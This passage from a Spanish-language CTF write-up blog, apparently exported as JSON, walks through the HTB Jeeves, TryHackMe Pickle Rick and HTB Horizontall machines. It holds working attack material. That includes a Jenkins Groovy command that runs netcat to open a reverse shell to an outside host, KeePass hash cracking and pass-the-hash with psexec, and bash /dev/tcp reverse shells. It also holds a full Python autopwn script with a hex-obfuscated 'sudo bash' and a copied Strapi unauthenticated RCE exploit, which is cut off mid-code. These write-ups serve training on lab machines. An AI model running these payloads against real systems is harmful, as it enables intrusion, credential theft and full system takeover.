but not required| smb2-time: |   date: 2023-02-11T02:09:58|_  start_date: 2023-02-11T02:00:02En primer lugar, se observa el puerto 445 abierto, el cual corresponde al servicio smb, por lo tanto, intentaremos realizar una enumeración del equipo y también si es posible de usuarios o recursos, para ello usaremos diferentes herramientas, la primera es crackmapexec:crackmapexec smb 10.10.10.63SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)Intentamos listar recursos compartidos mediante smbmap:smbmap -H 10.10.10.63[!] Authentication error on 10.10.10.63Pero necesitamos credenciales para poder listar contenido.Observamos que se tiene el puerto 80 con un servicio http, por lo tanto, utilizamos whatweb para enumerar información:whatweb 10.10.10.63http://10.10.10.63 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.63], Microsoft-IIS[10.0], Title[Ask Jeeves]Observamos que corresponde a un IIS, sin embargo, nada adicional que no nos reporte nmap, por lo tanto, iremos al navegador para ver qué encontramos:Tenemos una página, sin embargo, al ingresar un imput nos redirige a una página de error, si vemos el código fuente observamos:&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ask Jeeves&lt;/title&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\"&gt;&lt;/head&gt;&lt;body&gt;&lt;form class=\"form-wrapper cf\" action=\"error.html\"&gt;    &lt;div class=\"byline\"&gt;&lt;p&gt;&lt;a href=\"#\"&gt;Web&lt;/a&gt;, &lt;a href=\"#\"&gt;images&lt;/a&gt;, &lt;a href=\"#\"&gt;news&lt;/a&gt;, and &lt;a href=\"#\"&gt;lots of answers&lt;/a&gt;.&lt;/p&gt;&lt;/div&gt;  \t&lt;input type=\"text\" placeholder=\"Search here...\" required&gt;\t  &lt;button type=\"submit\"&gt;Search&lt;/button&gt;    &lt;div class=\"byline-bot\"&gt;Skins&lt;/div&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;Hace un action hacia la página de error, por lo tanto, esta web no hace nada.Obsevamos que está abierto el puerto 50000, lo cual es extraño, entraremos a ver que hay:Encontramos esta página, para descubrir directorios utilizaremos wfuzz:wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 http://10.10.10.63:50000/FUZZLuego, obtenemos un directorio:=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                                           =====================================================================000041607:   302        0 L      0 W        0 Ch        \"askjeeves\" Ingresamos a este directorio para ver que hay:Encontramos un panel de jenkins, si nos fijamos bien existe un área bastante interesante llamada Manage Jenkins, si entramos vemos lo siguiente:ExplotaciónEncontramos algo muy interesante, se trata de la script console, la cual permite ejecutar scripts de forma arbitraria utilizando Groovy, si buscamos en la web encontramos la siguiente forma de ingresar comandos:println \"whoami\".execute().textResultjeeves\\kohsukeObservamos que podemos ejectuar comandos correctamente, en este punto como es una máquina windows utilizaremos el netcat.exe, para transferirlo a la máquina víctima utilizaremos impacket-smbserver, para compartir el netcat y ejectuar una reverse shell en la máquina víctima:impacket-smbserver shares $(pwd) -smb2supportImpacket v0.10.1.dev1+20230203.111903.32178de6 - Copyright 2022 Fortra[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsedTeniendo el servidor smb compartiendo el archivo, dentro de jenkins intentaremos acceder al netcat y ejectuarlo:println \"\\\\10.10.14.17\\shares\\nc.exe -e cmd 10.10.14.17 1234\".execute().textSin embargo, esto falla debido a que el backslash se utiliza para escapar caracteres, entonces haremos uso de doble backslash:println \"\\\\\\\\10.10.14.17\\\\shares\\\\nc.exe -e cmd 10.10.14.17 1234\".execute().textSi observamos el servidor smb, hemos recibido una conexión y si revimos nuestro netcat:nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.10.63] 49684Microsoft Windows [Version 10.0.10586](c) 2015 Microsoft Corporation. All rights reserved.C:\\Users\\Administrator\\.jenkins&gt;whoamiwhoamijeeves\\kohsukeHemos conseguido entrar al sistema como el usuario kohsuke, ahora buscaremos la flag:C:\\Users\\kohsuke\\Desktop&gt;type user.txttype user.txte3232272596fb47950d59c4Escalada de privilegiosSi vamos abriendo las distintas carpetas del usuario kohsuke, encontramos lo siguiente:Directory of C:\\Users\\kohsuke\\Documents11/03/2017  10:18 PM    &lt;DIR&gt;          .11/03/2017  10:18 PM    &lt;DIR&gt;          ..09/18/2017  12:43 PM             2,846 CEH.kdbx               1 File(s)          2,846 bytes               2 Dir(s)   2,642,771,968 bytes freeEncontramos un archivo .kdbx que corresponde a la extensión de keepass, podríamos sacar contraseñas con esto asi que lo traeremos a nuestro equipo a través del smb:C:\\Users\\kohsuke\\Documents&gt;copy C:\\Users\\kohsuke\\Documents\\CEH.kdbx \\\\10.10.14.17\\sharescopy C:\\Users\\kohsuke\\Documents\\CEH.kdbx \\\\10.10.14.17\\shares        1 file(s) copied.De esta forma tenemos el archivo en nuestro equipo. Utilizando la herramienta keepassxc abrimos este archivo:Pero este archivo está protegido por contraseña, para intentar obtenerla utilizaremos keepass2john:keepass2john CEH.kdbxCEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48Este hash lo intentamos romper con john:john --wordlist=/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (KeePass [SHA256 AES 32/64])Cost 1 (iteration count) is 6000 for all loaded hashesCost 2 (version) is 2 for all loaded hashesCost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status0g 0:00:00:25 0.13% (ETA: 01:53:10) 0g/s 865.8p/s 865.8c/s 865.8C/s kameron1..ilovepeter0g 0:00:00:32 0.16% (ETA: 01:55:02) 0g/s 862.4p/s 862.4c/s 862.4C/s 101203..060306moonshine1       (CEH)     1g 0:00:01:08 DONE (2023-02-10 20:21) 0.01456g/s 800.5p/s 800.5c/s 800.5C/s nando1..moonshine1Use the \"--show\" option to display all of the cracked passwords reliablySession completed. Tenemos que la contraseña es moonshine1, vamos a keepass y la introducimos:Hemos entrado, si empezamos a revisar de arriba a abajo, encontramos esto:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00Debido a la forma que tiene corresponde a un hash NTLM, si utilizamos el LM podriamos ser capaces de realizar un pass the hash, sin embargo, vamos a verificar con crackmapexec si esto es válido:crackmapexec smb 10.10.10.63 -u'Administrator' -H 'e0fb1fb85756c24235ff238cbe81fe00'SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)SMB         10.10.10.63     445    JEEVES           [+] Jeeves\\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)Observamos que si es correcto, entonces podemos hacer uso de la utilidad impacket-psexec para hacer pass the hash:impacket-psexec WORKGROUP/Administrator@10.10.10.63 -hashes :e0fb1fb85756c24235ff238cbe81fe00Impacket v0.10.1.dev1+20230203.111903.32178de6 - Copyright 2022 Fortra[*] Requesting shares on 10.10.10.63.....[*] Found writable share ADMIN$[*] Uploading file AJsKtBPE.exe[*] Opening SVCManager on 10.10.10.63.....[*] Creating service TxXq on 10.10.10.63.....[*] Starting service TxXq.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.10586](c) 2015 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt; whoamint authority\\systemObservamos que hemos ganado acceso al sistema como administrador, ahora buscaremos la flag:C:\\Users\\Administrator\\Desktop&gt; type hm.txtThe flag is elsewhere.  Look deeper.Encontramos este mensaje, nos hace pensar que hay información oculta, como en linux pueden existir carpetas que no podemos ver a priori, en windows se llaman ADS, alternative data streams:C:\\Users\\Administrator\\Desktop&gt; dir /r /s Volume in drive C has no label. Volume Serial Number is 71A1-6FA1 Directory of C:\\Users\\Administrator\\Desktop11/08/2017  09:05 AM    &lt;DIR&gt;          .11/08/2017  09:05 AM    &lt;DIR&gt;          ..12/24/2017  02:51 AM                36 hm.txt                                    34 hm.txt:root.txt:$DATA11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk               2 File(s)            833 bytes     Total Files Listed:               2 File(s)            833 bytes               2 Dir(s)   2,641,616,896 bytes freeObservamos que existe el archivo hm.txt:root.txt, entonces utilizando more podemos ver el contenido:C:\\Users\\Administrator\\Desktop&gt; more &lt; hm.txt:root.txtafbc5bd4b615a60648c¡Bien!Hemos ganado acceso como administrador.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Pickle Rick TryHackMe Write-up",
    "url": "/posts/picklerick/",
    "categories": "Write up, TryHackMe",
    "tags": "Enumeration, Web, Information leakage, SUDO, Autopwn, Scripting, Fuzzing, Linux, Easy",
    "date": "2023-02-09 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de TryHackMe llamada Pikle Rick, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración de...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de TryHackMe llamada Pikle Rick, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del sistema.  Fuzzing de directorios web.  Abuso de la web.  Abuso de SUDO.Siendo sincero, no sabía si subir esta máquina pues es demasiado fácil, pero bueno, vamos a ello.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.170.234PING 10.10.170.234 (10.10.170.234) 56(84) bytes of data.64 bytes from 10.10.170.234: icmp_seq=1 ttl=63 time=215 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap en búsqueda de puertos abiertos, en este caso utilizando parámetros como -sS y –min-rate para acelerar el proceso, pues estamos en un CTF:sudo nmap -p- -sS --open --min-rate 5000 10.10.170.234 -oG portScanAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpRealizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p22,80 10.10.170.234 -oN services     Como resultado del escaneo tenemos:PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 99d38b2b1976f7b2e4206d459f98a775 (RSA)|   256 d38c694e94bae7182f59c601e5fba011 (ECDSA)|_  256 3da279a5437138fb95f5500cf8ef9352 (ED25519)80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-title: Rick is sup4r cool|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTenemos un servicio http, si intentamos buscar por vulnerabilidades asociadas a las versiones de los servicios utilizados en la máquina, no encontraremos nada, por lo tanto, utilizando la herramienta whatweb vamos a enumerar información del sitio web que nos puede ser de utilidad:whatweb 10.10.170.234http://10.10.170.234 [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.170.234], JQuery, Script, Title[Rick is sup4r cool]Vamos a ingresar a la web para ver que encontramos:ExplotaciónVemos la página principal, sin embargo, no hay mucho que hacer con respecto al análisis de parte de la web, pues no podemos realizar ninguna interacción con la misma. Echemosle un ojo al código fuente por si encontramos algo especial:Vemos un nombre de usuario, R1ckRul3s.Si seguimos buscando no entramos mucho, vamos a realizar fuzzing para encontrar nuevos directorios, para ello utilizaremos gobuster, por el hecho que es más facil fuzzear con distintas extensiones:gobuster -u http://10.10.170.234 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -x php,txtComo resultado tenemos:/login.php            (Status: 200) [Size: 882]/assets               (Status: 301) [Size: 315] [--&gt; http://10.10.170.234/assets/]/portal.php           (Status: 302) [Size: 0] [--&gt; /login.php]                    /robots.txt           (Status: 200) [Size: 17]Vemos página interesantes, vamos a ver el login:Necesitamos credenciales válidas, y no tenemos nada. Antes de realizar fuerza bruta, vamos a buscar por los otros directorios, en verdad el portal.php, redirige al login, por lo tanto, vamos a ver el robots.txt:Vemos esta palabra, vamos a asumir que es una contraseña, asi que iremos la panel de login e intentamos entrar:Hemos entrado. Podemos ver un imput para ejectuar comandos, esto no se ve nada bien, vamos a ingresar el comando id:Estamos ejecutando comandos en la máquina víctima. Por lo tanto, vamos a ganar acceso con el siguiente comando:bash -c 'bash -i &gt;&amp; /dev/tcp/10.14.48.121/1234 0&gt;&amp;1'Con el cual estamos enviandonos una consola interactiva a nuestra máquina, por lo tanto, vamos a tener nc escuchando las conexiones entrantes por el puerto 1234:nc -nvlp 1234   listening on [any] 1234 ...Lo ejecutamos en la web:Al enviarlo, revisamos nuestro netcat:nc -nvlp 1234   listening on [any] 1234 ...connect to [10.14.48.121] from (UNKNOWN) [10.10.170.234] 41450bash: cannot set terminal process group (1344): Inappropriate ioctl for devicebash: no job control in this shellwww-data@ip-10-10-170-234:/var/www/html$ whoamiwhoamiwww-datawww-data@ip-10-10-170-234:/var/www/html$ ¡Bien!, ganamos acceso.Escalada de privilegiosEl primer paso será arreglar la terminal, para ello vamos a ejecutar los siguiente comandos:  script /dev/null -c bash  control + z  stty ray -echo; fg  reset xterm  export TERM=xterm  export SHELL=bash  stty rows X columns Y (dependiendo de tu stty size)De esta forma obtenemos una stty más cómoda.Si vemos los archivos del directorio:www-data@ip-10-10-170-234:/var/www/html$ lslsSup3rS3cretPickl3Ingred.txtassetsclue.txtdenied.phpindex.htmllogin.phpportal.phprobots.txtTenemos el primer ingrediente.www-data@ip-10-10-170-234:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt mr. **************Vamos a buscar a los directorios personales de los usuarios:www-data@ip-10-10-170-234:/var/www/html$ cd /homewww-data@ip-10-10-170-234:/home$ lsrick  ubuntuwww-data@ip-10-10-170-234:/home$ ls rick/second ingredientswww-data@ip-10-10-170-234:/home$ cat rick/second\\ ingredients 1 ********Tenemos ya el segundo ingrediente, en este punto vamos a ver nuestros privilegios:www-data@ip-10-10-170-234:/home$ sudo -lMatching Defaults entries for www-data on    ip-10-10-170-234.eu-west-1.compute.internal:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on        ip-10-10-170-234.eu-west-1.compute.internal:    (ALL) NOPASSWD: ALLBueno, podemos ejectuar cualquier comando como root, por lo tanto, vamos a convertinos en el:www-data@ip-10-10-170-234:/home$ sudo bashroot@ip-10-10-170-234:/home# whoamirootListo, nos hemos convertido en root, vamos a buscar el últimos ingrediente:root@ip-10-10-170-234:/home# cat /root/3rd.txt3rd ingredients: ******Listo, hemos completado la máquina.Como la máquina ha sido demasiado sencilla, vamos a realizar la automatización de la intrusión, esto lo haremos mediante python como siempre.El primer paso son las librarías que utilizaremos:import requests,sys,signalfrom pwn import *Luego, definimos los colores, la función para salir del sistema y las variables globales:Colors = {    'red': '\\033[31m',    'green': '\\033[32m',    'yellow': '\\033[33m',    'blue': '\\033[34m',    'purple': '\\033[35m',    'cyan': '\\033[36m',    'grey': '\\033[37m',    'reset': '\\033[0m'}def exiting():    print(Colors['red']+\"\\n[!] saliendo...\\n\"+Colors['reset'])    sys.exit(1)if len(sys.argv) &lt; 3:    print(Colors['yellow'] + f'\\n[!] Uso: python3 {sys.argv[0]} \"IP\"  \"Victim_IP\"' + Colors['reset'] )    exiting()s = requests.Session()victim = f'http://{sys.argv[2]}/login.php'victim_portal = f'http://{sys.argv[2]}/portal.php'Luego, más utilidades como el control + c y funciones para animación y sucesos completados:def controlc(sig, frame):    print(Colors['red']+\"\\n\\n[!] saliendo...\\n\"+Colors['reset'])    sys.exit(1)signal.signal(signal.SIGINT, controlc)def wait():    for i in range(3):        print(Colors['purple'] + \".\", end='')        time.sleep(0.8)    print(Colors['reset'] + '\\n')    returndef success():    print(Colors['green'] + \"\\t¡Completado!\"+ Colors['reset'])    sleep(1)Tenemos entonces, la función de inicio de sesión:def login():    post_data= {        'username': 'R1ckRul3s',        'password': 'Wubbalubbadubdub',        'sub':'Login'    }    print(Colors['purple']+\"\\nIniciando sesión en la página\"+Colors['reset'],end='')    wait()    r = s.post(victim,data=post_data)    success()Luego, la función que realiza la conexión reversa:def shell():    payload = f'bash -c \"bash -i &gt;&amp; /dev/tcp/{sys.argv[1]}/1234 0&gt;&amp;1\"'    post_data={        'command': payload,        'sub' : 'Execute'    }    r = s.post(victim_portal,data=post_data)Finalmente, el main, donde llamamos las funciones y preparemos el listener, además de realizar la escalada de privilegios:if __name__ == '__main__':    login()    print(Colors['purple']+\"\\nEstableciendo la conexión reversa\"+Colors['reset'],end='')    wait()    try:        threading.Thread(target=shell, args=()).start()    except Exception as e:        log.error(str(e))        shell = listen(1234, timeout=15).wait_for_connection()    if shell.sock is None:        print(Colors['red'] + \"\\nNo se ha obtenido ninguna conexión :(\" + Colors['reset'])        sleep(1)        exiting()    else:        print('\\n')        success()        print(Colors['green'] + \"\\n\\t[+]Conexión establecida como usuario www-data\\n\" + Colors['reset'])        time.sleep(1)        print(Colors['purple'] + \"\\nIniciando escalada de privilegios\" + Colors['reset'],end='')    wait()    shell.sendline(b'\\x73\\x75\\x64\\x6f\\x20\\x62\\x61\\x73\\x68')    print(Colors['green'] + \"\\nPwned!!!\\n\" + Colors['reset'])    shell.interactive()Si lo ejecutamos:[*] Switching to interactive modebash: cannot set terminal process group (1344): Inappropriate ioctl for devicebash: no job control in this shellwww-data@ip-10-10-170-234:/var/www/html$ sudo bash$ whoamiroot$  El código completo es el siguiente:import requests,sys,signalfrom pwn import *Colors = {    'red': '\\033[31m',    'green': '\\033[32m',    'yellow': '\\033[33m',    'blue': '\\033[34m',    'purple': '\\033[35m',    'cyan': '\\033[36m',    'grey': '\\033[37m',    'reset': '\\033[0m'}def exiting():    print(Colors['red']+\"\\n[!] saliendo...\\n\"+Colors['reset'])    sys.exit(1)if len(sys.argv) &lt; 3:    print(Colors['yellow'] + f'\\n[!] Uso: python3 {sys.argv[0]} \"IP\"  \"Victim_IP\"' + Colors['reset'] )    exiting()s = requests.Session()victim = f'http://{sys.argv[2]}/login.php'victim_portal = f'http://{sys.argv[2]}/portal.php'def controlc(sig, frame):    print(Colors['red']+\"\\n\\n[!] saliendo...\\n\"+Colors['reset'])    sys.exit(1)signal.signal(signal.SIGINT, controlc)def wait():    for i in range(3):        print(Colors['purple'] + \".\", end='')        time.sleep(0.8)    print(Colors['reset'] + '\\n')    returndef success():    print(Colors['green'] + \"\\t¡Completado!\"+ Colors['reset'])    sleep(1)def login():    post_data= {        'username': 'R1ckRul3s',        'password': 'Wubbalubbadubdub',        'sub':'Login'    }    print(Colors['purple']+\"\\nIniciando sesión en la página\"+Colors['reset'],end='')    wait()    r = s.post(victim,data=post_data)    success()def shell():    payload = f'bash -c \"bash -i &gt;&amp; /dev/tcp/{sys.argv[1]}/1234 0&gt;&amp;1\"'    post_data={        'command': payload,        'sub' : 'Execute'    }    r = s.post(victim_portal,data=post_data)if __name__ == '__main__':    login()    print(Colors['purple']+\"\\nEstableciendo la conexión reversa\"+Colors['reset'],end='')    wait()    try:        threading.Thread(target=shell, args=()).start()    except Exception as e:        log.error(str(e))        shell = listen(1234, timeout=15).wait_for_connection()    if shell.sock is None:        print(Colors['red'] + \"\\nNo se ha obtenido ninguna conexión :(\" + Colors['reset'])        sleep(1)        exiting()    else:        print('\\n')        success()        print(Colors['green'] + \"\\n\\t[+]Conexión establecida como usuario www-data\\n\" + Colors['reset'])        time.sleep(1)        print(Colors['purple'] + \"\\nIniciando escalada de privilegios\" + Colors['reset'],end='')    wait()    shell.sendline(b'\\x73\\x75\\x64\\x6f\\x20\\x62\\x61\\x73\\x68')    print(Colors['green'] + \"\\nPwned!!!\\n\" + Colors['reset'])    shell.interactive()Hemos terminado la automatización de la intrusión.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Horizontall HTB Write-up",
    "url": "/posts/Horizontall/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, Fuzzing, Web, RCE, CMS, Port forwarding, Exploit, Linux, Easy",
    "date": "2023-02-09 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Horizontall, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeració...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Horizontall, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del sistema con nmap.  Inspección de código fuente de página para encontrar subdominios.  Fuzzing para encontrar directorios en página web.  Vulnerabilidad en CMS strapi (RCE).  Port forwarding utilizando ssh.  Vulnerabilidad en Laravel (RCE).Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.11.105PING 10.10.11.105 (10.10.11.105) 56(84) bytes of data.64 bytes from 10.10.11.105: icmp_seq=1 ttl=63 time=145 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap -p- -sS -open -min-rate 5000 10.10.11.105 -oG PortsAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpRealizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p22,80 10.10.11.105 -oN ServiceScanComo resultado del escaneo tenemos:ORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 ee774143d482bd3e6e6e50cdff6b0dd5 (RSA)|   256 3ad589d5da9559d9df016837cad510b0 (ECDSA)|_  256 4a0004b49d29e7af37161b4f802d9894 (ED25519)80/tcp open  http    nginx 1.14.0 (Ubuntu)|_http-title: Did not follow redirect to http://horizontall.htb|_http-server-header: nginx/1.14.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelObservamos que hay un servidor web, en primer lugar utilizaremos la herramienta whatweb para enumerar información:whatweb 10.10.11.105http://10.10.11.105 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], RedirectLocation[http://horizontall.htb], Title[301 Moved Permanently], nginx[1.14.0]http://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]Observamos un redirect hacia horizontall.htb, abriremos el /etc/hosts para ingresar esta dirección para que pueda resolver correctamente:127.0.0.1       localhost127.0.1.1       kali::1             localhost ip6-localhost ip6-loopbackff02::1         ip6-allnodesff02::2         ip6-allrouters10.10.11.105    horizontall.htbLuego, abrimos nuestro navegador para observar que hay en esta página:Si analizamos la página e intentamos navegar por ella nos damos cuenta que es solo una página estática, sin embargo, utilizaremos la herramienta wfuzz para buscar directorios:wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 horizontall.htb/FUZZID           Response   Lines    Word       Chars       Payload                                                                                                                                           =====================================================================000000001:   200        1 L      43 W       901 Ch      \"# directory-list-2.3-medium.txt\"                                                                                                                 000000003:   200        1 L      43 W       901 Ch      \"# Copyright 2007 James Fisher\"                                                                                                                   000000007:   200        1 L      43 W       901 Ch      \"# license, visit http://creativecommons.org/licenses/by-sa/3.0/\"                                                                                 000000002:   200        1 L      43 W       901 Ch      \"#\"                                                                                                                                               000000013:   200        1 L      43 W       901 Ch      \"#\"                                                                                                                                               000000039:   301        7 L      13 W       194 Ch      \"img\"                                                                                                                                             000000005:   200        1 L      43 W       901 Ch      \"# This work is licensed under the Creative Commons\"                                                                                              000000004:   200        1 L      43 W       901 Ch      \"#\"                                                                                                                                               000000008:   200        1 L      43 W       901 Ch      \"# or send a letter to Creative Commons, 171 Second Street,\"                                                                                      000000010:   200        1 L      43 W       901 Ch      \"#\"                                                                                                                                               000000006:   200        1 L      43 W       901 Ch      \"# Attribution-Share Alike 3.0 License. To view a copy of this\"                                                                                   000000011:   200        1 L      43 W       901 Ch      \"# Priority ordered case sensative list, where entries were found\"                                                                                000000014:   200        1 L      43 W       901 Ch      \"http://horizontall.htb/\"                                                                                                                         000000012:   200        1 L      43 W       901 Ch      \"# on atleast 2 different hosts\"                                                                                                                  000000009:   200        1 L      43 W       901 Ch      \"# Suite 300, San Francisco, California, 94105, USA.\"                                                                                             000000550:   301        7 L      13 W       194 Ch      \"css\"                                                                                                                                             000000953:   301        7 L      13 W       194 Ch      \"js\"                                                                                                                                              000045240:   200        1 L      43 W       901 Ch      \"http://horizontall.htb/\"   Sin embargo, no reportó nada especial. Vamos a revisar el código fuente de la página:Observamos que el código está en una sola linea, lo que dificulta su lectura, si buscamos en la web html pretty online encontramos una web que nos puede ordenar el código:Nos vemos demasiadas cosas, sin embargo, no tenemos más opción que buscar por los archivos .js por información, abriremos el primer archiv .js llamado js/app.c68eb462.js:Podemos ver el código js, si lo vamos revisando rápido, observamos algo interesante:var t=this;r.a.get(\"http://api-prod.horizontall.htb/reviews\")Tenemos un subdominio, por lo tanto, lo incluiremos en el /etc/hosts:127.0.0.1       localhost127.0.1.1       kali::1             localhost ip6-localhost ip6-loopbackff02::1         ip6-allnodesff02::2         ip6-allrouters10.10.11.105    horizontall.htb api-prod.horizontall.htbAl ingresar a la web vemos lo siguiente:En este punto haremos fuzzing utilizando wfuzz para descubrir directorios de interés:wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 http://api-prod.horizontall.htb/FUZZEncontramos 2 directorios:000000259:   200        16 L     101 W      854 Ch  \"admin\"                                                                                                                                           000001609:   200        0 L      21 W       507 Ch      \"Reviews\"    El admin y Reviews, vamos a inspecionarlos, para Reviews:Para admin:Observamos un panel de autenticación, corresponde a un CMS llamado strapi, si buscamos vulnerabilidades con la herramienta searchsploit, tenemos:searchsploit strapi--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                                                                                                   |  Path--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                                                                               | multiple/webapps/50237.pyStrapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                                                                             | multiple/webapps/50238.pyStrapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                                                       | multiple/webapps/50239.pyStrapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                                                                                         | nodejs/webapps/50716.rbExplotaciónObservamos que existe un exploit para ejecución remota de comandos sin estar autenticado, esto parece prometedor, vamos a inspeccionarlo:# Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)# Date: 2021-08-30# Exploit Author: Musyoka Ian# Vendor Homepage: https://strapi.io/# Software Link: https://strapi.io/# Version: Strapi CMS version 3.0.0-beta.17.4 or lower# Tested on: Ubuntu 20.04# CVE : CVE-2019-18818, CVE-2019-19609#!/usr/bin/env python3import requestsimport jsonfrom cmd import Cmdimport sysif len(sys.argv) != 2:    print(\"[-] Wrong number of arguments provided\")    print(\"[*] Usage: python3 exploit.py &lt;URL&gt;\\n\")    sys.exit()class Terminal(Cmd):    prompt = \"$&gt; \"    def default(self, args):        code_exec(args)def check_version():    global url    print(\"[+] Checking Strapi CMS Version running\")    version = requests.get(f\"{url}/admin/init\").text    version = json.loads(version)    version = version[\"data\"][\"strapiVersion\"]    if version == \"3.0.0-beta.17.4\":        print(\"[+] Seems like the exploit will work!!!\\n[+] Executing exploit\\n\\n\")    else:        print(\"[-] Version mismatch trying the exploit anyway\")def password_reset():    global url, jwt    session = requests.session()    params = {\"code\" : {\"$gt\":0},            \"password\" : \"SuperStrongPassword1\",            \"passwordConfirmation\" : \"SuperStrongPassword1\"            }    output = session.post(f\"{url}/admin/auth/reset-password\", json = params).text    response = json.loads(output)    jwt = response[\"jwt\"]    username = response[\"user\"][\"username\"]    email = response[\"user\"][\"email\"]    if \"jwt\" not in output:        print(\"[-] Password reset unsuccessfull\\n[-] Exiting now\\n\\n\")        sys.exit(1)    else:        print(f\"[+] Password reset was successfully\\n[+] Your email is: {email}\\n[+] Your new credentials are: {username}:SuperStrongPassword1\\n[+] Your authenticated JSON Web Token: {jwt}\\n\\n\")def code_exec(cmd):    global jwt, url    print(\"[+] Triggering Remote code executin\\n[*] Rember this is a blind RCE don't expect to see output\")    headers = {\"Authorization\" : f\"Bearer {jwt}\"}    data = {\"plugin\" : f\"documentation &amp;&amp; $({cmd})\",            \"port\" : \"1337\"}    out = 